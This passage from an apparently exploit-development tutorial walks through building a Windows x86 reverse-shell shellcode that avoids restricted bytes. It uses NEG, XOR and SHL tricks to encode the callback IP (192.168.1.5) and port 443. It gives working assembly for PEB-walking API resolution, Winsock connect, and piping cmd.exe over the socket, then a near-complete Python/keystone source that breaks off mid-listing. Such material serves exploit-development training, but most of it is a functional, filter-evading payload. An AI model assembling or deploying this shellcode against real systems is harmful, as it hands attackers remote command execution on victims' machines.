### Step 3: The Encoding Toolkit -- NEG, XOR, and SHL

Before we get to the function calls, every value that would produce a bad byte must be encoded. Three techniques are used throughout:

**NEG (two's complement):** `mov cl, 0xF8; neg cl` produces `0x08`. The `neg` instruction computes `0 - operand`, so `0x100 - 0xF8 = 0x08`.

**XOR masking:** The IP address `192.168.1.5` (`0x0501A8C0`) XORed with key `0x50505050` produces `0x5551F890` -- all printable bytes. At runtime, XOR again to recover the original.

**SHL (shift left):** `mov al, 0xBB; shl eax, 0x08` produces `0xBB00`. Then `inc eax` gives `0xBB01` (port 443 in network order). No byte in the instruction stream is ever zero.

```nasm
ip_address_port:
    xor   ecx, ecx               ; ECX = 0
    mov   cl, 0xF8
    neg   cl                      ; CL = 0x08
    xor   eax, eax
    mov   eax, 0x5551F890         ; XOR-encoded IP
    xor   eax, 0x50505050         ; decode: 0x0501A8C0 = 192.168.1.5
    mov   [ebp+0x2C], eax         ; save decoded IP
    xor   eax, eax
    mov   al, 0xBB
    shl   eax, cl                 ; EAX = 0xBB00 (CL still 0x08)
    inc   eax                     ; EAX = 0xBB01 (port 443)
    mov   [ebp+0x30], eax         ; save port
```

<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1202" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1202"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1202" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1202" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="340" rx="10" fill="url(#bg_s1202)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1202)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1202)" font-weight="bold">Encoding Adapter: Raw Value to Null-Free Assembly</text>
  <rect x="40" y="50" width="200" height="45" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="140" y="67" text-anchor="middle" fill="#ff3366" font-size="10" font-weight="bold">NEG Technique</text>
  <text x="140" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">mov cl, 0xF8 -> neg cl = 0x08</text>
  <rect x="270" y="50" width="200" height="45" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="370" y="67" text-anchor="middle" fill="#ff6b35" font-size="10" font-weight="bold">XOR Technique</text>
  <text x="370" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">val ^ 0x50505050 -> decode at runtime</text>
  <rect x="500" y="50" width="200" height="45" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="600" y="67" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">SHL Technique</text>
  <text x="600" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">shl eax, 8 -> shift into high byte</text>
  <text x="375" y="122" text-anchor="middle" fill="#00d4ff" font-size="13" font-weight="bold">IP Address Encoding (XOR)</text>
  <rect x="50" y="135" width="280" height="70" rx="6" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="190" y="158" text-anchor="middle" fill="#ff3366" font-size="12">Raw: 192.168.1.5</text>
  <text x="190" y="178" text-anchor="middle" fill="#ff3366" font-size="11">= 0x0501A8C0 (has 0x05, 0x01)</text>
  <text x="190" y="195" text-anchor="middle" fill="#8b949e" font-size="9">Contains restricted bytes!</text>
  <line x1="335" y1="168" x2="405" y2="168" stroke="#00ff88" stroke-width="2" marker-end="url(#arr_s1202)"/>
  <text x="370" y="160" text-anchor="middle" fill="#00ff88" font-size="9">XOR 0x50505050</text>
  <rect x="410" y="135" width="280" height="70" rx="6" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="550" y="158" text-anchor="middle" fill="#00ff88" font-size="12">Encoded: 0x5551F890</text>
  <text x="550" y="178" text-anchor="middle" fill="#00ff88" font-size="11">All bytes > 0x50 -- safe!</text>
  <text x="550" y="195" text-anchor="middle" fill="#8b949e" font-size="9">XOR again at runtime to decode</text>
  <text x="375" y="230" text-anchor="middle" fill="#00d4ff" font-size="13" font-weight="bold">Port 443 Construction (SHL + INC)</text>
  <rect x="50" y="245" width="155" height="40" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="127" y="269" text-anchor="middle" fill="#ff6b35" font-size="10">mov al, 0xBB</text>
  <line x1="208" y1="265" x2="228" y2="265" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1202)"/>
  <rect x="232" y="245" width="155" height="40" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="309" y="269" text-anchor="middle" fill="#ff6b35" font-size="10">shl eax, 0x08</text>
  <line x1="390" y1="265" x2="410" y2="265" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1202)"/>
  <rect x="414" y="245" width="155" height="40" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="491" y="269" text-anchor="middle" fill="#00ff88" font-size="10">inc eax</text>
  <text x="595" y="269" text-anchor="middle" fill="#e0e7ff" font-size="11">= 0xBB01</text>
  <text x="595" y="285" text-anchor="middle" fill="#8b949e" font-size="9">(port 443)</text>
  <text x="375" y="325" text-anchor="middle" fill="#8b949e" font-size="11">Key insight: CL = 0x08 is reused across IP and port construction (set once via neg)</text>
</svg></div>

*Figure 12.2 -- The encoding toolkit. NEG builds small values from large ones, XOR masks multi-byte constants, and SHL constructs values byte-by-byte.*

### Step 4: Calling WSAStartup (Restricted)

Even `WSAStartup` requires encoding gymnastics. The version `0x0202` is built using `shl` and `inc` instead of a direct `mov`:

```nasm
call_WSAStartup:
    xor   ecx, ecx
    mov   cl, 0xF8
    neg   cl                      ; CL = 0x08
    xor   eax, eax
    inc   eax                     ; EAX = 1
    shl   eax, cl                 ; EAX = 0x0100
    mov   al, 0x90                ; EAX = 0x0190 = 400 (WSADATA size)
    sub   esp, eax                ; allocate WSADATA
    mov   esi, esp                ; ESI = &WSADATA
    xor   eax, eax
    inc   eax
    inc   eax                     ; EAX = 2
    shl   eax, cl                 ; EAX = 0x0200
    inc   eax
    inc   eax                     ; EAX = 0x0202 (version 2.2)
    push  esi                     ; push &WSADATA
    push  eax                     ; push 0x0202
    call  dword ptr [ebp+0x20]    ; WSAStartup
```

> Notice how `0x0202` is built: start with 2, shift left 8 bits to get `0x0200`, then increment twice. No single instruction ever contains `0x02 0x02` as an immediate.

### Step 5: Calling WSASocketA (Restricted)

The value `6` (IPPROTO_TCP) is built via `neg`:

```nasm
call_WSASocketA:
    xor   eax, eax
    push  eax                     ; dwFlags = 0
    push  eax                     ; g = 0
    push  eax                     ; lpProtocolInfo = NULL
    mov   al, 0xFA
    neg   al                      ; AL = 0x06 (IPPROTO_TCP)
    push  eax                     ; push protocol
    xor   eax, eax
    inc   eax                     ; EAX = 1 (SOCK_STREAM)
    push  eax
    inc   eax                     ; EAX = 2 (AF_INET)
    push  eax
    call  dword ptr [ebp+0x24]    ; WSASocketA
    mov   [ebp+0x34], eax         ; save socket
```

### Step 6: Calling connect with Encoded Address

Here we use `connect` (simpler than `WSAConnect`, only 3 parameters) with the pre-decoded IP and port from Step 3:

```nasm
call_connect:
    xor   eax, eax
    mov   al, 0xF0
    neg   al                      ; AL = 0x10 = 16
    sub   esp, eax                ; allocate sockaddr_in (16 bytes)
    mov   edi, esp                ; EDI = &sockaddr_in
    xor   eax, eax
    inc   eax
    inc   eax                     ; EAX = 2
    mov   word ptr [edi], ax      ; sin_family = AF_INET
    xor   eax, eax
    mov   eax, [ebp+0x30]        ; load pre-built port (0xBB01)
    mov   word ptr [edi+0x02], ax ; sin_port = 443
    xor   eax, eax
    mov   eax, [ebp+0x2C]        ; load XOR-decoded IP
    mov   [edi+0x04], eax         ; sin_addr = 192.168.1.5
    xor   eax, eax
    mov   al, 0xF0
    neg   al                      ; AL = 0x10
    push  eax                     ; namelen = 16
    push  edi                     ; &sockaddr_in
    push  dword ptr [ebp+0x34]    ; socket
    call  dword ptr [ebp+0x28]    ; connect()
```

<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1203" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1203"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1203" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1203" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="200" rx="10" fill="url(#bg_s1203)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1203)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1203)" font-weight="bold">connect() vs. WSAConnect()</text>
  <rect x="50" y="50" width="300" height="120" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="200" y="75" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">WSAConnect (7 params)</text>
  <text x="200" y="100" text-anchor="middle" fill="#e0e7ff" font-size="10">WSAConnect(s, name, namelen,</text>
  <text x="200" y="118" text-anchor="middle" fill="#e0e7ff" font-size="10">  lpCallerData, lpCalleeData,</text>
  <text x="200" y="136" text-anchor="middle" fill="#e0e7ff" font-size="10">  lpSQOS, lpGQOS)</text>
  <text x="200" y="158" text-anchor="middle" fill="#8b949e" font-size="10">4 extra NULLs to push</text>
  <rect x="400" y="50" width="300" height="120" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="550" y="75" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">connect (3 params)</text>
  <text x="550" y="100" text-anchor="middle" fill="#e0e7ff" font-size="10">connect(s, name, namelen)</text>
  <text x="550" y="126" text-anchor="middle" fill="#00ff88" font-size="11">Simpler, fewer bytes</text>
  <text x="550" y="150" text-anchor="middle" fill="#8b949e" font-size="10">Fewer pushes = fewer potential bad bytes</text>
</svg></div>

*Figure 12.3 -- The restricted shell uses connect() instead of WSAConnect() -- 3 parameters instead of 7, reducing the number of instructions that might produce bad bytes.*

### Step 7: STARTUPINFOA (Restricted Construction)

The `0x0100` (STARTF_USESTDHANDLES) flag is built using `shl` instead of a direct `mov`:

```nasm
struct_STARTUPINFOA:
    xor   ecx, ecx
    mov   cl, 0xF8
    neg   cl                      ; CL = 0x08
    xor   eax, eax
    inc   eax                     ; EAX = 1
    shl   eax, cl                 ; EAX = 0x0100 (STARTF_USESTDHANDLES)
    mov   cl, 0x44                ; cb size
    mov   dword ptr [edi], ecx    ; si.cb = 0x44
    mov   [edi+0x2C], eax         ; si.dwFlags = 0x0100
    xor   eax, eax
    mov   eax, [ebp+0x34]        ; EAX = socket
    mov   [edi+0x38], eax         ; hStdInput  = socket
    mov   [edi+0x3C], eax         ; hStdOutput = socket
    mov   [edi+0x40], eax         ; hStdError  = socket
    xor   esi, esi
    xchg  esi, edi                ; ESI = &STARTUPINFOA
```

### Step 8: CreateProcessA, WaitForSingleObject, and ExitProcess

After spawning the shell, `WaitForSingleObject` blocks until cmd.exe exits:

```nasm
call_CreateProcessA:
    ; ... (build "cmd.exe" on stack using shl technique) ...
    xor   eax, eax
    push  ebx                     ; lpProcessInformation
    push  esi                     ; lpStartupInfo
    push  eax                     ; lpCurrentDirectory = NULL
    push  eax                     ; lpEnvironment = NULL
    push  eax                     ; dwCreationFlags = 0
    inc   eax
    push  eax                     ; bInheritHandles = TRUE
    dec   eax
    push  eax                     ; lpThreadAttributes = NULL
    push  eax                     ; lpProcessAttributes = NULL
    push  edi                     ; lpCommandLine = "cmd.exe"
    push  eax                     ; lpApplicationName = NULL
    call  dword ptr [ebp+0x14]    ; CreateProcessA

call_WaitForSingleObject:
    xor   eax, eax
    mov   eax, 0xFFFFFFFF         ; INFINITE (-1)
    push  eax                     ; dwMilliseconds = INFINITE
    push  dword ptr [ebx]        ; hProcess (from PROCESS_INFORMATION)
    call  dword ptr [ebp+0x18]    ; WaitForSingleObject

call_ExitProcess:
    xor   eax, eax
    push  eax                     ; uExitCode = 0
    call  dword ptr [ebp+0x1C]    ; ExitProcess(0)
```

<div align="center"><svg viewBox="0 0 750 240" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1204" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1204"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1204" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1204" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="240" rx="10" fill="url(#bg_s1204)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1204)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1204)" font-weight="bold">WaitForSingleObject: Keeping the Shell Alive</text>
  <rect x="40" y="50" width="200" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="140" y="72" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">CreateProcessA</text>
  <text x="140" y="90" text-anchor="middle" fill="#e0e7ff" font-size="10">cmd.exe spawned</text>
  <line x1="240" y1="77" x2="270" y2="77" stroke="#00ff88" stroke-width="2" marker-end="url(#arr_s1204)"/>
  <rect x="275" y="50" width="200" height="55" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="375" y="72" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">WaitForSingleObject</text>
  <text x="375" y="90" text-anchor="middle" fill="#e0e7ff" font-size="10">INFINITE wait (-1)</text>
  <line x1="475" y1="77" x2="505" y2="77" stroke="#00ff88" stroke-width="2" marker-end="url(#arr_s1204)"/>
  <rect x="510" y="50" width="200" height="55" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="610" y="72" text-anchor="middle" fill="#8b949e" font-size="11" font-weight="bold">ExitProcess</text>
  <text x="610" y="90" text-anchor="middle" fill="#e0e7ff" font-size="10">clean shutdown</text>
  <rect x="80" y="125" width="590" height="95" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="375" y="148" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">Why WaitForSingleObject Matters</text>
  <text x="375" y="172" text-anchor="middle" fill="#e0e7ff" font-size="11">Without it: CreateProcessA returns -> shellcode exits -> cmd.exe orphaned -> socket closes</text>
  <text x="375" y="192" text-anchor="middle" fill="#00ff88" font-size="11">With it: shellcode blocks until cmd.exe exits -> user types commands -> then clean exit</text>
  <text x="375" y="210" text-anchor="middle" fill="#8b949e" font-size="10">PROCESS_INFORMATION[0] = hProcess handle, passed as first arg to WaitForSingleObject</text>
</svg></div>

*Figure 12.4 -- WaitForSingleObject(-1) blocks the shellcode until cmd.exe terminates. Without it, the connection drops immediately after the shell spawns.*

### Complete Restricted Shell Flow

<div align="center"><svg viewBox="0 0 750 180" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1205" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1205"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1205" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1205" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="180" rx="10" fill="url(#bg_s1205)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1205)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1205)" font-weight="bold">Restricted Charset Reverse Shell Flow</text>
  <rect x="10" y="50" width="88" height="45" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="54" y="68" text-anchor="middle" fill="#00d4ff" font-size="8" font-weight="bold">Resolve</text>
  <text x="54" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">kernel32 (4)</text>
  <line x1="98" y1="72" x2="108" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1205)"/>
  <rect x="112" y="50" width="88" height="45" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="156" y="68" text-anchor="middle" fill="#ff6b35" font-size="8" font-weight="bold">Load + Resolve</text>
  <text x="156" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">ws2_32 (3)</text>
  <line x1="200" y1="72" x2="210" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1205)"/>
  <rect x="214" y="50" width="88" height="45" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="258" y="68" text-anchor="middle" fill="#ff3366" font-size="8" font-weight="bold">Encode IP/Port</text>
  <text x="258" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">XOR + SHL + NEG</text>
  <line x1="302" y1="72" x2="312" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1205)"/>
  <rect x="316" y="50" width="88" height="45" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="360" y="68" text-anchor="middle" fill="#ff3366" font-size="8" font-weight="bold">Winsock</text>
  <text x="360" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">WSA + connect</text>
  <line x1="404" y1="72" x2="414" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1205)"/>
  <rect x="418" y="50" width="88" height="45" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="462" y="68" text-anchor="middle" fill="#00ff88" font-size="8" font-weight="bold">Shell</text>
  <text x="462" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">CreateProcessA</text>
  <line x1="506" y1="72" x2="516" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1205)"/>
  <rect x="520" y="50" width="88" height="45" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="564" y="68" text-anchor="middle" fill="#ff3366" font-size="8" font-weight="bold">Wait</text>
  <text x="564" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">INFINITE</text>
  <line x1="608" y1="72" x2="618" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1205)"/>
  <rect x="622" y="50" width="88" height="45" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="666" y="68" text-anchor="middle" fill="#8b949e" font-size="8" font-weight="bold">Exit</text>
  <text x="666" y="82" text-anchor="middle" fill="#e0e7ff" font-size="7">ExitProcess</text>
  <rect x="50" y="115" width="650" height="45" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="135" text-anchor="middle" fill="#e0e7ff" font-size="11">Every value in the shellcode is constructed at runtime to avoid restricted bytes</text>
  <text x="375" y="152" text-anchor="middle" fill="#8b949e" font-size="10">Same functionality as Section 10, but with an encoding adapter around every constant</text>
</svg></div>

*Figure 12.5 -- The restricted-charset reverse shell: same logic as Section 10, but every constant that would produce a bad byte is built at runtime using NEG, XOR, and SHL.*

### Full Shellcode Source (`restrected_shell.py`)

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "
    "   mov   ebp, esp                  ;"
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   modulename[12] == 0x00?
    "   jne   next_module               ;"

    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"

    " find_function_ret:                 "
    "   pop esi                         ;"
    "   mov   [ebp+0x04], esi           ;"
    "   jmp resolve_symbols_kernel32    ;"

    " find_function_shorten_bnc:         "
    "   call find_function_ret          ;"

    " find_function:                     "
    "   pushad                          ;"
    "   mov   eax, [ebx+0x3c]           ;"
    "   mov   edi, [ebx+eax+0x78]       ;"
    "   add   edi, ebx                  ;"
    "   mov   ecx, [edi+0x18]           ;"
    "   mov   eax, [edi+0x20]           ;"
    "   add   eax, ebx                  ;"
    "   mov   [ebp-4], eax              ;"

    " find_function_loop:                "
    "   jecxz find_function_finished    ;"
    "   dec   ecx                       ;"
    "   mov   eax, [ebp-4]              ;"
    "   mov   esi, [eax+ecx*4]          ;"
    "   add   esi, ebx                  ;"

    " compute_hash:                      "
    "   xor   eax, eax                  ;"
    "   cdq                             ;"
    "   cld                             ;"

    " compute_hash_again:                "
    "   lodsb                           ;"
    "   test  al, al                    ;"
    "   jz    compute_hash_finished     ;"
    "   ror   edx, 0x0d                 ;"  #   ROR-13
    "   add   edx, eax                  ;"
    "   jmp   compute_hash_again        ;"

    " compute_hash_finished:             "

    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"
    "   jnz   find_function_loop        ;"
    "   mov   edx, [edi+0x24]           ;"
    "   add   edx, ebx                  ;"
    "   mov   cx,  [edx+2*ecx]          ;"
    "   mov   edx, [edi+0x1c]           ;"
    "   add   edx, ebx                  ;"
    "   mov   eax, [edx+4*ecx]          ;"
    "   add   eax, ebx                  ;"
    "   mov   [esp+0x1c], eax           ;"

    " find_function_finished:            "
    "   popad                           ;"
    "   ret                             ;"

    " resolve_symbols_kernel32:          "
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x10], eax           ;"
    "   push  0x16b3fe72                ;"  #   CreateProcessA hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x14], eax           ;"
    "   push  0xce05d9ad                ;"  #   WaitForSingleObject hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x18], eax           ;"
    "   push  0x73e2d87e                ;"  #   ExitProcess hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x1C], eax           ;"

    " load_ws2_32_dll:                   "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x6c6c                ;"
    "   push  eax                       ;"
    "   push  0x642e3233                ;"
    "   push  0x5f327377                ;"
    "   mov   esi, esp                  ;"
    "   push  esi                       ;"
    "   call  dword ptr [ebp+0x10]      ;"  #   LoadLibraryA("ws2_32.dll")

    " resolve_symbols_ws2_32_dll:        "
    "   mov   ebx, eax                  ;"
    "   push  0x3bfcedcb                ;"  #   WSAStartup hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x20], eax           ;"
    "   push  0xadf509d9                ;"  #   WSASocketA hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x24], eax           ;"
    "   push  0x60aaf9ec                ;"  #   connect hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x28], eax           ;"

    " ip_address_port:                   "
    "   xor   ecx, ecx                  ;"
    "   mov   cl, 0xF8                  ;"
    "   neg   cl                        ;"  #   CL = 0x08
    "   xor   eax, eax                  ;"
    "   mov   eax, 0x5551F890           ;"  #   XOR-encoded IP
    "   xor   eax, 0x50505050           ;"  #   decode: 192.168.1.5
    "   mov   [ebp+0x2C], eax           ;"
    "   xor   eax, eax                  ;"
    "   mov   al, 0xBB                  ;"
    "   shl   eax, cl                   ;"  #   EAX = 0xBB00
    "   inc   eax                       ;"  #   EAX = 0xBB01 (port 443)
    "   mov   [ebp+0x30], eax           ;"

    " call_WSAStartup:                   "
    "   xor   ecx, ecx                  ;"
    "   mov   cl, 0xF8                  ;"
    "   neg   cl                        ;"  #   CL = 0x08
    "   xor   eax, eax                  ;"
    "   inc   eax                       ;"
    "   shl   eax, cl                   ;"  #   0x0100
    "   mov   al, 0x90                  ;"  #   0x0190 = 400
    "   sub   esp, eax                  ;"
    "   mov   esi, esp                  ;"
    "   xor   eax, eax                  ;"
    "   inc   eax                       ;"
    "   inc   eax                       ;"  #   EAX = 2
    "   shl   eax, cl                   ;"  #   0x0200
    "   inc   eax                       ;"
    "   inc   eax                       ;"  #   0x0202
    "   push  esi                       ;"
    "   push  eax                       ;"
    "   call  dword ptr [ebp+0x20]      ;"

    " call_WSASocketA:                   "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   mov   al, 0xFA                  ;"
    "   neg   al                        ;"  #   AL = 0x06
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   inc   eax                       ;"
    "   push  eax                       ;"
    "   inc   eax                       ;"
    "   push  eax                       ;"
    "   call  dword ptr [ebp+0x24]      ;"
    "   mov   [ebp+0x34], eax           ;"

    " call_connect:                      "
    "   xor   eax, eax                  ;"
    "   mov   al, 0xF0                  ;"
    "   neg   al                        ;"  #   AL = 0x10
    "   sub   esp, eax                  ;"
    "   mov   edi, esp                  ;"
    "   xor   eax, eax                  ;"
    "   inc   eax                       ;"
    "   inc   eax                       ;"
    "   mov   word ptr [edi], ax        ;"  #   sin_family = 2
    "   xor   eax, eax                  ;"
    "   mov   eax, [ebp+0x30]           ;"
    "   mov   word ptr [edi+0x02], ax   ;"  #   sin_port = 443
    "   xor   eax, eax                  ;"
    "   mov   eax, [ebp+0x2C]           ;"
    "   mov   [edi+0x04], eax           ;"  #   sin_addr = 192.168.1.5
    "   xor   eax, eax                  ;"
    "   mov   al, 0xF0                  ;"
    "   neg   al                        ;"  #   0x10
    "   push  eax                       ;"
    "   push  edi                       ;"
    "   push  dword ptr [ebp+0x34]      ;"
    "   call  dword ptr [ebp+0x28]      ;"  #   connect()

    " zero_structs:                      "
    "   xor   eax, eax                  ;"
    "   xor   ecx, ecx                  ;"
    "   mov   cl, 0x44                  ;"
    "   sub   esp, ecx                  ;"
    "   mov   edi, esp                  ;"
    "   push  ecx                       ;"
    "   rep   stosb                     ;"
    "   pop   ecx                       ;"
    "   sub   edi, ecx                  ;"

    " struct_STARTUPINFOA:               "
    "   xor   ecx, ecx                  ;"
    "   mov   cl, 0xF8                  ;"
    "   neg   cl                        ;"  #   CL = 0x08
    "   xor   eax, eax                  ;"
    "   inc   eax                       ;"
    "   shl   eax, cl                   ;"  #   0x0100
    "   mov   cl, 0x44                  ;"
    "   mov   dword ptr [edi], ecx      ;"  #   cb = 0x44
    "   mov   [edi+0x2C], eax           ;"  #   dwFlags = 0x0100
    "   xor   eax, eax                  ;"
    "   mov   eax, [ebp+0x34]           ;"
    "   mov   [edi+0x38], eax           ;"  #   hStdInput
    "   mov   [edi+0x3C], eax           ;"  #   hStdOutput
    "   mov   [edi+0x40], eax           ;"  #   hStdError
    "   xor   esi, esi                  ;"
    "   xchg  esi, edi                  ;"

    " zero_structs_pi:                   "
    "   xor   eax, eax                  ;"
    "   xor   ecx, ecx                  ;"
    "   mov   cl, 0x10                  ;"
    "   sub   esp, ecx                  ;"
    "   mov   edi, esp                  ;"
    "   push  ecx                       ;"
    "   rep   stosb                     ;"
    "   pop   ecx                       ;"
    "   sub   edi, ecx                  ;"
    "   mov   ebx, edi                  ;"

    " call_CreateProcessA:               "
    "   xor   edi, edi                  ;"
    "   xor   ecx, ecx                  ;"
    "   mov   cl, 0xF8                  ;"
